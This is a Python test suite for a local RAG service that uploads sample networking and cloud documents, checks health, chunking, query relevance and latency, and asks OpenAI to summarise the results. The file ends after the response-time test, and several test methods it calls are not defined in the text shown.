# Comprehensive RAG System Test Suite with OpenAI Integration

## File: comprehensive_test_suite.py
```python
import pytest
import asyncio
import requests
import json
import time
import logging
import tempfile
import shutil
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime, timedelta
import threading
import concurrent.futures
import statistics
import uuid
import hashlib
import openai
from dataclasses import dataclass, asdict
import numpy as np

# Test configuration
BASE_URL = "http://localhost:8000"
API_KEY = "test_api_key_123"
OPENAI_API_KEY = None  # Will be loaded from openai.json

HEADERS = {
    "Authorization": f"Bearer {API_KEY}",
    "Content-Type": "application/json"
}

@dataclass
class TestResult:
    """Test result data structure"""
    test_name: str
    status: str  # PASS, FAIL, SKIP
    duration_ms: float
    details: Dict[str, Any]
    error_message: Optional[str] = None
    timestamp: str = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now().isoformat()

@dataclass
class SystemAnalysis:
    """Comprehensive system analysis results"""
    test_results: List[TestResult]
    performance_metrics: Dict[str, Any]
    system_health: Dict[str, Any]
    openai_analysis: Dict[str, Any]
    recommendations: List[str]
    overall_score: float
    timestamp: str

class OpenAIAnalyzer:
    """OpenAI integration for intelligent test analysis"""
    
    def __init__(self, config_file: str = "openai.json"):
        self.client = None
        self.config = {}
        self._load_config(config_file)
        
    def _load_config(self, config_file: str):
        """Load OpenAI configuration from JSON file"""
        try:
            config_path = Path(config_file)
            if config_path.exists():
                with open(config_path, 'r') as f:
                    self.config = json.load(f)
                
                api_key = self.config.get('api_key') or self.config.get('OPENAI_API_KEY')
                if api_key:
                    self.client = openai.OpenAI(api_key=api_key)
                    logging.info("✅ OpenAI client initialized successfully")
                else:
                    logging.warning("⚠️ OpenAI API key not found in config")
            else:
                logging.warning(f"⚠️ OpenAI config file {config_file} not found")
                # Create template
                self._create_config_template(config_path)
        except Exception as e:
            logging.error(f"❌ Failed to load OpenAI config: {e}")
    
    def _create_config_template(self, config_path: Path):
        """Create OpenAI configuration template"""
        template = {
            "api_key": "your_openai_api_key_here",
            "model": "gpt-4-turbo-preview",
            "max_tokens": 2000,
            "temperature": 0.1,
            "analysis_prompts": {
                "system_analysis": "You are an expert system analyst. Analyze the provided RAG system test results and provide insights, identify issues, and recommend improvements.",
                "performance_review": "You are a performance engineer. Review the provided metrics and identify bottlenecks, optimization opportunities, and scaling recommendations.",
                "quality_assessment": "You are a QA engineer. Assess the quality of responses and identify areas for improvement in accuracy, relevance, and user experience."
            }
        }
        
        with open(config_path, 'w') as f:
            json.dump(template, f, indent=2)
        
        logging.info(f"📋 Created OpenAI config template: {config_path}")
    
    def analyze_test_results(self, test_results: List[TestResult], 
                           performance_metrics: Dict[str, Any]) -> Dict[str, Any]:
        """Use OpenAI to analyze test results and provide insights"""
        if not self.client:
            return {"error": "OpenAI client not available"}
        
        try:
            # Prepare analysis data
            analysis_data = {
                "test_summary": {
                    "total_tests": len(test_results),
                    "passed": len([t for t in test_results if t.status == "PASS"]),
                    "failed": len([t for t in test_results if t.status == "FAIL"]),
                    "average_duration_ms": np.mean([t.duration_ms for t in test_results]),
                    "failed_tests": [{"name": t.test_name, "error": t.error_message} 
                                   for t in test_results if t.status == "FAIL"]
                },
                "performance_metrics": performance_metrics,
                "detailed_results": [asdict(t) for t in test_results[-10:]]  # Last 10 tests
            }
            
            # Create analysis prompt
            prompt = f"""
            {self.config.get('analysis_prompts', {}).get('system_analysis', 'Analyze the following RAG system test results:')}
            
            Test Results Summary:
            {json.dumps(analysis_data, indent=2)}
            
            Please provide:
            1. Overall system health assessment
            2. Key issues identified
            3. Performance bottlenecks
            4. Recommendations for improvement
            5. Risk assessment
            6. Priority actions
            
            Format your response as a structured JSON with sections: health_score (0-100), issues, recommendations, risks, and priorities.
            """
            
            response = self.client.chat.completions.create(
                model=self.config.get('model', 'gpt-4-turbo-preview'),
                messages=[{"role": "user", "content": prompt}],
                max_tokens=self.config.get('max_tokens', 2000),
                temperature=self.config.get('temperature', 0.1)
            )
            
            # Parse response
            ai_analysis = response.choices[0].message.content
            
            # Try to extract JSON if present
            try:
                import re
                json_match = re.search(r'\{.*\}', ai_analysis, re.DOTALL)
                if json_match:
                    parsed_analysis = json.loads(json_match.group())
                else:
                    parsed_analysis = {"raw_analysis": ai_analysis}
            except:
                parsed_analysis = {"raw_analysis": ai_analysis}
            
            return {
                "openai_analysis": parsed_analysis,
                "model_used": self.config.get('model', 'gpt-4-turbo-preview'),
                "analysis_timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            logging.error(f"OpenAI analysis failed: {e}")
            return {"error": str(e)}

class ComprehensiveTestSuite:
    """Comprehensive test suite for RAG system analysis"""
    
    def __init__(self, base_url: str = BASE_URL, api_key: str = API_KEY):
        self.base_url = base_url
        self.api_key = api_key
        self.headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
        self.test_results = []
        self.temp_files = []
        self.openai_analyzer = OpenAIAnalyzer()
        
        # Test data
        self.test_documents = self._create_test_documents()
        self.test_queries = self._create_test_queries()
        
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)
    
    def _create_test_documents(self) -> Dict[str, str]:
        """Create comprehensive test documents"""
        return {
            "network_security.txt": """
            Network Security Best Practices Guide
            
            Firewall Configuration:
            1. Default deny policy for all incoming traffic
            2. Allow only necessary ports and protocols
            3. Implement stateful inspection
            4. Regular rule review and cleanup
            5. Log all denied connections
            
            VPN Security:
            1. Use strong encryption (AES-256)
            2. Implement multi-factor authentication
            3. Regular certificate rotation
            4. Monitor VPN usage patterns
            5. Implement split tunneling policies
            
            Network Monitoring:
            1. Deploy SIEM solutions
            2. Real-time traffic analysis
            3. Intrusion detection systems
            4. Network segmentation monitoring
            5. Endpoint detection and response
            
            Incident Response:
            1. Immediate containment procedures
            2. Forensic evidence collection
            3. Communication protocols
            4. Recovery procedures
            5. Post-incident analysis
            """,
            
            "cisco_bgp_advanced.txt": """
            Advanced BGP Configuration and Troubleshooting
            
            BGP Route Filtering:
            1. Prefix lists for granular control
            2. Route maps for complex policies
            3. AS-path filtering for security
            4. Community-based routing
            5. Regular expression filters
            
            BGP Optimization:
            1. Route aggregation strategies
            2. BGP confederations
            3. Route reflector design
            4. Fast external failover
            5. BGP dampening configuration
            
            Troubleshooting Commands:
            - show ip bgp summary
            - show ip bgp neighbors
            - show ip route bgp
            - debug ip bgp updates
            - clear ip bgp * soft
            
            Security Considerations:
            1. BGP authentication with MD5
            2. Maximum prefix limits
            3. Route filtering best practices
            4. RPKI implementation
            5. BGP monitoring and alerting
            """,
            
            "cloud_architecture.txt": """
            Cloud Architecture Design Principles
            
            Scalability Patterns:
            1. Horizontal scaling with load balancers
            2. Auto-scaling groups configuration
            3. Database sharding strategies
            4. Microservices architecture
            5. Event-driven design patterns
            
            Security Architecture:
            1. Zero-trust network model
            2. Identity and access management
            3. Encryption at rest and in transit
            4. Security groups and NACLs
            5. Regular security assessments
            
            Disaster Recovery:
            1. Multi-region deployment
            2. Automated backup strategies
            3. RTO and RPO planning
            4. Failover testing procedures
            5. Data replication methods
            
            Cost Optimization:
            1. Reserved instance planning
            2. Right-sizing resources
            3. Automated resource cleanup
            4. Cost monitoring and alerting
            5. Spot instance utilization
            """,
            
            "api_documentation.txt": """
            RESTful API Design Guidelines
            
            HTTP Methods:
            - GET: Retrieve resources
            - POST: Create new resources
            - PUT: Update entire resources
            - PATCH: Partial resource updates
            - DELETE: Remove resources
            
            Status Codes:
            - 200: Success
            - 201: Created
            - 400: Bad Request
            - 401: Unauthorized
            - 404: Not Found
            - 500: Internal Server Error
            
            Authentication:
            1. OAuth 2.0 implementation
            2. JWT token management
            3. API key strategies
            4. Rate limiting policies
            5. Session management
            
            Documentation Standards:
            1. OpenAPI specifications
            2. Interactive API explorers
            3. Code examples in multiple languages
            4. Error response documentation
            5. Versioning strategies
            """,
            
            "database_optimization.txt": """
            Database Performance Optimization
            
            Index Strategies:
            1. Clustered vs non-clustered indexes
            2. Composite index design
            3. Index maintenance procedures
            4. Query execution plan analysis
            5. Index usage monitoring
            
            Query Optimization:
            1. SQL query analysis
            2. Execution plan optimization
            3. Statistics maintenance
            4. Parameter sniffing solutions
            5. Query hint usage
            
            Connection Management:
            1. Connection pooling strategies
            2. Connection timeout configuration
            3. Load balancing across replicas
            4. Failover mechanisms
            5. Monitoring connection health
            
            Backup and Recovery:
            1. Full, differential, and log backups
            2. Point-in-time recovery
            3. Backup verification procedures
            4. Cross-region backup strategies
            5. Recovery testing protocols
            """
        }
    
    def _create_test_queries(self) -> List[Dict[str, Any]]:
        """Create comprehensive test queries with expected characteristics"""
        return [
            {
                "query": "How do I configure BGP route filtering?",
                "expected_topics": ["bgp", "route", "filtering", "prefix", "policy"],
                "expected_sources": ["cisco_bgp_advanced.txt"],
                "complexity": "medium"
            },
            {
                "query": "What are the best practices for network security?",
                "expected_topics": ["security", "firewall", "vpn", "monitoring"],
                "expected_sources": ["network_security.txt"],
                "complexity": "low"
            },
            {
                "query": "Explain cloud architecture scalability patterns",
                "expected_topics": ["cloud", "scalability", "load", "microservices"],
                "expected_sources": ["cloud_architecture.txt"],
                "complexity": "high"
            },
            {
                "query": "How to optimize database query performance?",
                "expected_topics": ["database", "optimization", "query", "index"],
                "expected_sources": ["database_optimization.txt"],
                "complexity": "medium"
            },
            {
                "query": "What HTTP status codes should I use for API errors?",
                "expected_topics": ["api", "http", "status", "error"],
                "expected_sources": ["api_documentation.txt"],
                "complexity": "low"
            },
            {
                "query": "Compare BGP confederations vs route reflectors",
                "expected_topics": ["bgp", "confederation", "route reflector"],
                "expected_sources": ["cisco_bgp_advanced.txt"],
                "complexity": "high"
            },
            {
                "query": "What are zero-trust network principles?",
                "expected_topics": ["zero-trust", "security", "network", "access"],
                "expected_sources": ["network_security.txt", "cloud_architecture.txt"],
                "complexity": "medium"
            },
            {
                "query": "How to implement disaster recovery in the cloud?",
                "expected_topics": ["disaster", "recovery", "cloud", "backup"],
                "expected_sources": ["cloud_architecture.txt"],
                "complexity": "high"
            }
        ]
    
    async def run_comprehensive_analysis(self) -> SystemAnalysis:
        """Run complete system analysis with all tests"""
        self.logger.info("🚀 Starting comprehensive RAG system analysis...")
        start_time = time.time()
        
        # Clear previous results
        self.test_results = []
        
        # Run all test categories
        await self._run_system_health_tests()
        await self._run_api_functionality_tests()
        await self._run_document_processing_tests()
        await self._run_query_quality_tests()
        await self._run_performance_tests()
        await self._run_concurrency_tests()
        await self._run_edge_case_tests()
        await self._run_security_tests()
        await self._run_integration_tests()
        
        # Collect performance metrics
        performance_metrics = await self._collect_performance_metrics()
        
        # Get system health
        system_health = await self._get_system_health()
        
        # OpenAI analysis
        openai_analysis = self.openai_analyzer.analyze_test_results(
            self.test_results, performance_metrics
        )
        
        # Generate recommendations
        recommendations = self._generate_recommendations()
        
        # Calculate overall score
        overall_score = self._calculate_overall_score()
        
        total_duration = time.time() - start_time
        self.logger.info(f"✅ Analysis completed in {total_duration:.2f} seconds")
        
        analysis = SystemAnalysis(
            test_results=self.test_results,
            performance_metrics=performance_metrics,
            system_health=system_health,
            openai_analysis=openai_analysis,
            recommendations=recommendations,
            overall_score=overall_score,
            timestamp=datetime.now().isoformat()
        )
        
        # Save analysis results
        self._save_analysis_results(analysis)
        
        return analysis
    
    async def _run_system_health_tests(self):
        """Test system health and component status"""
        self.logger.info("🔍 Running system health tests...")
        
        # Test 1: Basic health check
        await self._run_test(
            "system_health_basic",
            self._test_basic_health_check,
            "Basic system health check"
        )
        
        # Test 2: Component health
        await self._run_test(
            "system_health_components",
            self._test_component_health,
            "Individual component health check"
        )
        
        # Test 3: Resource monitoring
        await self._run_test(
            "system_health_resources",
            self._test_resource_monitoring,
            "System resource monitoring"
        )
        
        # Test 4: External dependencies
        await self._run_test(
            "system_health_dependencies",
            self._test_external_dependencies,
            "External API dependencies check"
        )
    
    async def _run_api_functionality_tests(self):
        """Test API functionality and endpoints"""
        self.logger.info("🌐 Running API functionality tests...")
        
        # Test all API endpoints
        endpoints = [
            ("GET", "/health", None, False),
            ("GET", "/status", None, False),
            ("POST", "/query", {"query": "test"}, True),
            ("GET", "/chunks", None, True),
            ("GET", "/scheduler/status", None, True),
            ("GET", "/health/components", None, True)
        ]
        
        for method, endpoint, payload, auth_required in endpoints:
            await self._run_test(
                f"api_{method.lower()}_{endpoint.replace('/', '_')}",
                lambda m=method, e=endpoint, p=payload, a=auth_required: 
                    self._test_api_endpoint(m, e, p, a),
                f"API endpoint {method} {endpoint}"
            )
    
    async def _run_document_processing_tests(self):
        """Test document ingestion and processing"""
        self.logger.info("📄 Running document processing tests...")
        
        # Upload test documents
        for filename, content in self.test_documents.items():
            await self._run_test(
                f"doc_upload_{filename}",
                lambda f=filename, c=content: self._test_document_upload(f, c),
                f"Document upload: {filename}"
            )
        
        # Test document processing
        await self._run_test(
            "doc_processing_verification",
            self._test_document_processing_verification,
            "Document processing verification"
        )
        
        # Test chunk creation
        await self._run_test(
            "doc_chunk_creation",
            self._test_chunk_creation,
            "Document chunk creation"
        )
        
        # Test vector generation
        await self._run_test(
            "doc_vector_generation",
            self._test_vector_generation,
            "Vector generation from documents"
        )
    
    async def _run_query_quality_tests(self):
        """Test query processing and response quality"""
        self.logger.info("❓ Running query quality tests...")
        
        for i, query_test in enumerate(self.test_queries):
            await self._run_test(
                f"query_quality_{i}",
                lambda qt=query_test: self._test_query_quality(qt),
                f"Query quality: {query_test['query'][:50]}..."
            )
        
        # Test response consistency
        await self._run_test(
            "query_consistency",
            self._test_query_consistency,
            "Query response consistency"
        )
        
        # Test source attribution
        await self._run_test(
            "query_source_attribution",
            self._test_source_attribution,
            "Source attribution accuracy"
        )
    
    async def _run_performance_tests(self):
        """Test system performance under various loads"""
        self.logger.info("⚡ Running performance tests...")
        
        # Response time tests
        await self._run_test(
            "performance_response_time",
            self._test_response_times,
            "Response time performance"
        )
        
        # Throughput tests
        await self._run_test(
            "performance_throughput",
            self._test_throughput,
            "System throughput"
        )
        
        # Memory usage tests
        await self._run_test(
            "performance_memory",
            self._test_memory_usage,
            "Memory usage under load"
        )
        
        # Large document tests
        await self._run_test(
            "performance_large_docs",
            self._test_large_document_processing,
            "Large document processing"
        )
    
    async def _run_concurrency_tests(self):
        """Test concurrent operations"""
        self.logger.info("🔄 Running concurrency tests...")
        
        # Concurrent queries
        await self._run_test(
            "concurrency_queries",
            self._test_concurrent_queries,
            "Concurrent query processing"
        )
        
        # Concurrent uploads
        await self._run_test(
            "concurrency_uploads",
            self._test_concurrent_uploads,
            "Concurrent document uploads"
        )
        
        # Mixed operations
        await self._run_test(
            "concurrency_mixed",
            self._test_mixed_concurrent_operations,
            "Mixed concurrent operations"
        )
    
    async def _run_edge_case_tests(self):
        """Test edge cases and error conditions"""
        self.logger.info("🔥 Running edge case tests...")
        
        # Invalid queries
        await self._run_test(
            "edge_invalid_queries",
            self._test_invalid_queries,
            "Invalid query handling"
        )
        
        # Large queries
        await self._run_test(
            "edge_large_queries",
            self._test_large_queries,
            "Large query handling"
        )
        
        # Empty/malformed data
        await self._run_test(
            "edge_malformed_data",
            self._test_malformed_data,
            "Malformed data handling"
        )
        
        # Resource exhaustion
        await self._run_test(
            "edge_resource_exhaustion",
            self._test_resource_exhaustion,
            "Resource exhaustion scenarios"
        )
    
    async def _run_security_tests(self):
        """Test security aspects"""
        self.logger.info("🔒 Running security tests...")
        
        # Authentication tests
        await self._run_test(
            "security_auth",
            self._test_authentication,
            "API authentication security"
        )
        
        # Input validation
        await self._run_test(
            "security_input_validation",
            self._test_input_validation,
            "Input validation security"
        )
        
        # Rate limiting
        await self._run_test(
            "security_rate_limiting",
            self._test_rate_limiting,
            "Rate limiting functionality"
        )
    
    async def _run_integration_tests(self):
        """Test integrations with external systems"""
        self.logger.info("🔗 Running integration tests...")
        
        # ServiceNow integration
        await self._run_test(
            "integration_servicenow",
            self._test_servicenow_integration,
            "ServiceNow integration"
        )
        
        # LLM provider integration
        await self._run_test(
            "integration_llm",
            self._test_llm_integration,
            "LLM provider integration"
        )
        
        # Embedding provider integration
        await self._run_test(
            "integration_embeddings",
            self._test_embedding_integration,
            "Embedding provider integration"
        )
    
    # Test implementation methods
    async def _test_basic_health_check(self) -> Dict[str, Any]:
        """Test basic health endpoint"""
        response = requests.get(f"{self.base_url}/health", timeout=10)
        
        if response.status_code != 200:
            raise Exception(f"Health check failed: {response.status_code}")
        
        data = response.json()
        return {
            "status_code": response.status_code,
            "response_data": data,
            "response_time_ms": response.elapsed.total_seconds() * 1000
        }
    
    async def _test_component_health(self) -> Dict[str, Any]:
        """Test component health check"""
        response = requests.get(
            f"{self.base_url}/health/components", 
            headers=self.headers, 
            timeout=20
        )
        
        if response.status_code != 200:
            raise Exception(f"Component health check failed: {response.status_code}")
        
        data = response.json()
        components = data.get('components', [])
        
        # Analyze component health
        healthy_count = len([c for c in components if c.get('status') == 'healthy'])
        total_count = len(components)
        
        if healthy_count < total_count:
            unhealthy = [c['name'] for c in components if c.get('status') != 'healthy']
            raise Exception(f"Unhealthy components: {unhealthy}")
        
        return {
            "total_components": total_count,
            "healthy_components": healthy_count,
            "components": components
        }
    
    async def _test_api_endpoint(self, method: str, endpoint: str, 
                                payload: Dict = None, auth_required: bool = True) -> Dict[str, Any]:
        """Test individual API endpoint"""
        url = f"{self.base_url}{endpoint}"
        headers = self.headers if auth_required else {}
        
        if method == "GET":
            response = requests.get(url, headers=headers, timeout=10)
        elif method == "POST":
            response = requests.post(url, headers=headers, json=payload, timeout=10)
        else:
            raise Exception(f"Unsupported method: {method}")
        
        if response.status_code not in [200, 201]:
            raise Exception(f"API call failed: {response.status_code} - {response.text}")
        
        return {
            "status_code": response.status_code,
            "response_time_ms": response.elapsed.total_seconds() * 1000,
            "response_size": len(response.content)
        }
    
    async def _test_document_upload(self, filename: str, content: str) -> Dict[str, Any]:
        """Test document upload"""
        # Create temporary file
        temp_dir = Path(tempfile.mkdtemp())
        self.temp_files.append(temp_dir)
        
        file_path = temp_dir / filename
        file_path.write_text(content)
        
        # Upload file
        with open(file_path, 'rb') as f:
            files = {'file': (filename, f, 'text/plain')}
            headers = {"Authorization": f"Bearer {self.api_key}"}
            
            response = requests.post(
                f"{self.base_url}/upload",
                files=files,
                headers=headers,
                timeout=30
            )
        
        if response.status_code != 200:
            raise Exception(f"Upload failed: {response.status_code} - {response.text}")
        
        data = response.json()
        return {
            "file_id": data.get('file_id'),
            "filename": data.get('filename'),
            "status": data.get('status'),
            "file_size": len(content)
        }
    
    async def _test_query_quality(self, query_test: Dict[str, Any]) -> Dict[str, Any]:
        """Test query quality and response accuracy"""
        query = query_test['query']
        expected_topics = query_test['expected_topics']
        
        # Wait for document processing
        await asyncio.sleep(2)
        
        response = requests.post(
            f"{self.base_url}/query",
            headers=self.headers,
            json={"query": query, "max_results": 5},
            timeout=15
        )
        
        if response.status_code != 200:
            raise Exception(f"Query failed: {response.status_code} - {response.text}")
        
        data = response.json()
        answer = data.get('answer', '').lower()
        sources = data.get('sources', [])
        
        # Check if expected topics are covered
        topic_coverage = sum(1 for topic in expected_topics if topic in answer)
        coverage_score = topic_coverage / len(expected_topics)
        
        # Check source attribution
        has_sources = len(sources) > 0
        
        return {
            "query": query,
            "answer_length": len(data.get('answer', '')),
            "source_count": len(sources),
            "topic_coverage_score": coverage_score,
            "response_time_ms": data.get('response_time_ms', 0),
            "has_sources": has_sources,
            "topics_found": [topic for topic in expected_topics if topic in answer]
        }
    
    async def _test_concurrent_queries(self) -> Dict[str, Any]:
        """Test concurrent query processing"""
        queries = [q['query'] for q in self.test_queries[:5]]
        
        async def make_query(query):
            response = requests.post(
                f"{self.base_url}/query",
                headers=self.headers,
                json={"query": query},
                timeout=20
            )
            return {
                "status_code": response.status_code,
                "response_time_ms": response.elapsed.total_seconds() * 1000,
                "success": response.status_code == 200
            }
        
        # Run concurrent queries
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(asyncio.run, make_query(q)) for q in queries]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        total_time = time.time() - start_time
        
        # Analyze results
        successful = len([r for r in results if r['success']])
        avg_response_time = statistics.mean([r['response_time_ms'] for r in results])
        
        if successful < len(queries):
            raise Exception(f"Only {successful}/{len(queries)} concurrent queries succeeded")
        
        return {
            "total_queries": len(queries),
            "successful_queries": successful,
            "total_time_ms": total_time * 1000,
            "average_response_time_ms": avg_response_time,
            "queries_per_second": len(queries) / total_time
        }
    
    async def _run_test(self, test_name: str, test_func, description: str) -> TestResult:
        """Run individual test and record result"""
        start_time = time.time()
        
        try:
            self.logger.info(f"  🧪 Running: {description}")
            details = await test_func()
            duration_ms = (time.time() - start_time) * 1000
            
            result = TestResult(
                test_name=test_name,
                status="PASS",
                duration_ms=duration_ms,
                details=details
            )
            
            self.logger.info(f"  ✅ PASS: {description} ({duration_ms:.0f}ms)")
            
        except Exception as e:
            duration_ms = (time.time() - start_time) * 1000
            
            result = TestResult(
                test_name=test_name,
                status="FAIL",
                duration_ms=duration_ms,
                details={},
                error_message=str(e)
            )
            
            self.logger.error(f"  ❌ FAIL: {description} - {str(e)}")
        
        self.test_results.append(result)
        return result
    
    # Additional test implementation methods
    
    async def _test_resource_monitoring(self) -> Dict[str, Any]:
        """Test system resource monitoring"""
        response = requests.get(f"{self.base_url}/status", timeout=10)
        
        if response.status_code != 200:
            raise Exception(f"Status check failed: {response.status_code}")
        
        data = response.json()
        
        # Check resource usage
        memory_usage = data.get('memory_usage_mb', 0)
        cpu_usage = data.get('cpu_usage_percent', 0)
        
        if memory_usage > 1000:  # More than 1GB
            raise Exception(f"High memory usage: {memory_usage}MB")
        
        if cpu_usage > 90:
            raise Exception(f"High CPU usage: {cpu_usage}%")
        
        return {
            "memory_usage_mb": memory_usage,
            "cpu_usage_percent": cpu_usage,
            "total_files": data.get('total_files', 0),
            "total_chunks": data.get('total_chunks', 0),
            "total_vectors": data.get('total_vectors', 0)
        }
    
    async def _test_external_dependencies(self) -> Dict[str, Any]:
        """Test external API dependencies"""
        # Test through health endpoint
        response = requests.get(
            f"{self.base_url}/health/components",
            headers=self.headers,
            timeout=15
        )
        
        if response.status_code != 200:
            raise Exception(f"Dependencies check failed: {response.status_code}")
        
        data = response.json()
        components = data.get('components', [])
        
        # Find external dependency components
        external_deps = [
            c for c in components 
            if 'external' in c.get('name', '').lower() or 
               'llm' in c.get('name', '').lower() or 
               'embedding' in c.get('name', '').lower()
        ]
        
        failed_deps = [c for c in external_deps if c.get('status') != 'healthy']
        
        if failed_deps:
            raise Exception(f"Failed external dependencies: {[c['name'] for c in failed_deps]}")
        
        return {
            "total_dependencies": len(external_deps),
            "healthy_dependencies": len(external_deps) - len(failed_deps),
            "dependency_details": external_deps
        }
    
    async def _test_document_processing_verification(self) -> Dict[str, Any]:
        """Verify documents were processed correctly"""
        # Wait for processing
        await asyncio.sleep(5)
        
        response = requests.get(f"{self.base_url}/status", timeout=10)
        
        if response.status_code != 200:
            raise Exception(f"Status check failed: {response.status_code}")
        
        data = response.json()
        
        expected_docs = len(self.test_documents)
        actual_files = data.get('total_files', 0)
        actual_chunks = data.get('total_chunks', 0)
        actual_vectors = data.get('total_vectors', 0)
        
        if actual_files < expected_docs:
            raise Exception(f"Missing documents: expected {expected_docs}, got {actual_files}")
        
        if actual_chunks == 0:
            raise Exception("No chunks were created from documents")
        
        if actual_vectors == 0:
            raise Exception("No vectors were generated")
        
        return {
            "expected_documents": expected_docs,
            "processed_files": actual_files,
            "created_chunks": actual_chunks,
            "generated_vectors": actual_vectors,
            "chunks_per_file": actual_chunks / max(actual_files, 1)
        }
    
    async def _test_chunk_creation(self) -> Dict[str, Any]:
        """Test chunk creation and metadata"""
        response = requests.get(
            f"{self.base_url}/chunks",
            headers=self.headers,
            params={"limit": 50},
            timeout=10
        )
        
        if response.status_code != 200:
            raise Exception(f"Chunks retrieval failed: {response.status_code}")
        
        data = response.json()
        chunks = data.get('chunks', [])
        
        if not chunks:
            raise Exception("No chunks found")
        
        # Analyze chunk quality
        chunk_lengths = [len(chunk.get('content', '')) for chunk in chunks]
        avg_chunk_length = statistics.mean(chunk_lengths)
        
        # Check chunk metadata
        chunks_with_source = [c for c in chunks if c.get('source_id')]
        chunks_with_content = [c for c in chunks if c.get('content')]
        
        metadata_quality = len(chunks_with_source) / len(chunks)
        content_quality = len(chunks_with_content) / len(chunks)
        
        if metadata_quality < 0.9:
            raise Exception(f"Poor chunk metadata quality: {metadata_quality:.2f}")
        
        if content_quality < 1.0:
            raise Exception(f"Missing chunk content: {content_quality:.2f}")
        
        return {
            "total_chunks": len(chunks),
            "average_chunk_length": avg_chunk_length,
            "metadata_quality": metadata_quality,
            "content_quality": content_quality,
            "chunk_length_range": [min(chunk_lengths), max(chunk_lengths)]
        }
    
    async def _test_vector_generation(self) -> Dict[str, Any]:
        """Test vector generation and quality"""
        # Get system status to check vector count
        response = requests.get(f"{self.base_url}/status", timeout=10)
        
        if response.status_code != 200:
            raise Exception(f"Status check failed: {response.status_code}")
        
        data = response.json()
        vector_count = data.get('total_vectors', 0)
        chunk_count = data.get('total_chunks', 0)
        
        if vector_count == 0:
            raise Exception("No vectors generated")
        
        if vector_count != chunk_count:
            raise Exception(f"Vector count mismatch: {vector_count} vectors vs {chunk_count} chunks")
        
        # Test vector search functionality
        test_query = "network security"
        search_response = requests.post(
            f"{self.base_url}/query",
            headers=self.headers,
            json={"query": test_query, "max_results": 5},
            timeout=15
        )
        
        if search_response.status_code != 200:
            raise Exception(f"Vector search test failed: {search_response.status_code}")
        
        search_data = search_response.json()
        sources = search_data.get('sources', [])
        
        if not sources:
            raise Exception("Vector search returned no results")
        
        return {
            "total_vectors": vector_count,
            "vector_chunk_ratio": vector_count / max(chunk_count, 1),
            "search_test_results": len(sources),
            "search_response_time_ms": search_data.get('response_time_ms', 0)
        }
    
    async def _test_query_consistency(self) -> Dict[str, Any]:
        """Test query response consistency"""
        test_query = "What are BGP best practices?"
        responses = []
        
        # Run same query multiple times
        for _ in range(3):
            response = requests.post(
                f"{self.base_url}/query",
                headers=self.headers,
                json={"query": test_query},
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                responses.append({
                    "answer": data.get('answer', ''),
                    "source_count": len(data.get('sources', [])),
                    "response_time_ms": data.get('response_time_ms', 0)
                })
            
            await asyncio.sleep(1)  # Small delay between requests
        
        if len(responses) < 3:
            raise Exception("Failed to get consistent responses")
        
        # Analyze consistency
        answer_lengths = [len(r['answer']) for r in responses]
        source_counts = [r['source_count'] for r in responses]
        response_times = [r['response_time_ms'] for r in responses]
        
        # Check for reasonable consistency
        length_variance = statistics.variance(answer_lengths) if len(answer_lengths) > 1 else 0
        source_variance = statistics.variance(source_counts) if len(source_counts) > 1 else 0
        
        return {
            "response_count": len(responses),
            "average_answer_length": statistics.mean(answer_lengths),
            "answer_length_variance": length_variance,
            "average_source_count": statistics.mean(source_counts),
            "source_count_variance": source_variance,
            "average_response_time_ms": statistics.mean(response_times),
            "consistency_score": 1.0 / (1.0 + length_variance / 1000)  # Simple consistency metric
        }
    
    async def _test_source_attribution(self) -> Dict[str, Any]:
        """Test source attribution accuracy"""
        test_cases = [
            {"query": "BGP route filtering", "expected_source": "cisco_bgp_advanced"},
            {"query": "firewall configuration", "expected_source": "network_security"},
            {"query": "cloud scalability", "expected_source": "cloud_architecture"}
        ]
        
        attribution_results = []
        
        for test_case in test_cases:
            response = requests.post(
                f"{self.base_url}/query",
                headers=self.headers,
                json={"query": test_case["query"]},
                timeout=15
            )
            
            if response.status_code != 200:
                continue
            
            data = response.json()
            sources = data.get('sources', [])
            
            # Check if expected source is present
            expected_found = any(
                test_case["expected_source"] in source.get('source_name', '').lower()
                for source in sources
            )
            
            attribution_results.append({
                "query": test_case["query"],
                "expected_source": test_case["expected_source"],
                "found_expected": expected_found,
                "total_sources": len(sources),
                "top_source": sources[0].get('source_name', '') if sources else ''
            })
        
        # Calculate attribution accuracy
        correct_attributions = sum(1 for r in attribution_results if r['found_expected'])
        attribution_accuracy = correct_attributions / len(attribution_results)
        
        if attribution_accuracy < 0.7:
            raise Exception(f"Poor source attribution accuracy: {attribution_accuracy:.2f}")
        
        return {
            "test_cases": len(attribution_results),
            "correct_attributions": correct_attributions,
            "attribution_accuracy": attribution_accuracy,
            "attribution_details": attribution_results
        }
    
    async def _test_response_times(self) -> Dict[str, Any]:
        """Test system response times"""
        response_times = []
        
        # Test various query types
        test_queries = [
            "simple query",
            "What are the comprehensive best practices for implementing advanced network security measures?",
            "BGP",
            "Explain the differences between various cloud architecture patterns and their use cases"
        ]
        
        for query in test_queries:
            start_time = time.time()
            
            response = requests.post(
                f"{self.base_url}/query",
                headers=self.headers,
                json={"query": query},
                timeout=20
            )
            
            end_time = time.time()
            total_time = (end_time - start_time) * 1000
            
            if response.status_code == 200:
                data = response.json()
                api_time = data.get('response_time_ms', 0)
                
                response_times.append({
                    "query": query[:50],
                    "total_time_ms": total_time,
                    "api_reported_time_ms": api_time,
                    "network_overhead_ms": total_time - api_time
                })
        
        if not response_times:
            raise Exception("No successful response time measurements")
        
        avg_total_time = statistics.mean([r['total_time_ms'] for r in response_times])
        max_time = max([r['total_time_ms'] for r in response_times])
        min_time = min([r['total_time_ms'] for r in response_times])
        
        # Check performance thresholds
        if avg_total_time > 10000:  # 10 seconds
            raise Exception(f"Average response time too high: {avg_total_time:.0f}ms")
        
        if max_time > 20000:  # 20 seconds
            raise Exception(f"Maximum response time too high: {max_time:.0f}ms")
        
        return {
            "test_queries": len(response_times),
            "average_response_time_ms": avg_total_time,
            "max_response_time_ms": max_time,
            "min_response_time_ms": min_time,
            "response_time_details": response_times
        }
    
